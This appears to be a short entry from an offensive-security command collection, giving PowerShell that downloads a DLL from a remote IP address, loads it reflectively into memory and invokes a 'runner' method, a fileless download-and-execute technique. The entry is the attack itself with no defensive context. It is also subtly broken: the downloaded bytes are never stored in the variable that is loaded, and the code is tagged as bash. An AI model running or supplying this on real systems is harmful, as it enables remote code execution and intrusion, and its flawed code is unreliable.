---
id: 16db3764-6477-4c3f-8cfc-72182ec34e5f
name: Execute a specific method from an assembly
type: command
executor: bash
data: '(New-Object System.Net.WebClient).DownloadData(''http://10.10.16.7/lib.dll'')

  $assem = [System.Reflection.Assembly]::Load($data)

  $class = $assem.GetType("ClassLibrary1.Class1")

  $method = $class.GetMethod("runner")

  $method.Invoke(0, $null)'
output: null
created_at: '2023-04-06T03:56:24.082129+00:00'
updated_at: '2023-04-10T20:37:02.186238+00:00'
---

# Execute a specific method from an assembly

```bash
(New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```


